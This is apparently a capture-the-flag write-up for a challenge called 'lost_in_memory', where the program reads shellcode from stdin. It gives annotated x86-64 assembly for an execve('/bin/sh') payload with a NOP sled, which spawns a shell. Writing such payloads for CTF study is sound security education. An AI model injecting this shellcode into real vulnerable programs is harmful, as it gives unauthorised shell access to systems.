# lost_in_memory
The goal is to pop a shell to read the flag.
 
## Context
- The shellcode is read from `stdin`

## Approach
A simple shellcode is needed to invoke a shell using the execve("/bin/sh", NULL, NULL):
```{asm}
    nop
    nop
    nop
    nop
    xor rax, rax			; clear rax
    mov rax, 0x3b			; 0x3b is the syscall number for execve 
    xor rdx, rdx			; clear rdx
    xor rsi, rsi			; clear rsi
    mov rdi, 0x0068732f6e69622f		; move "/bin/sh" into rdi (reversed)
    push rdi				; push "/bin/sh" into the stack
    mov rdi, rsp			; move rsp into rdi (to get a pointer to "/bin/sh")
    syscall				; execute the syscall
```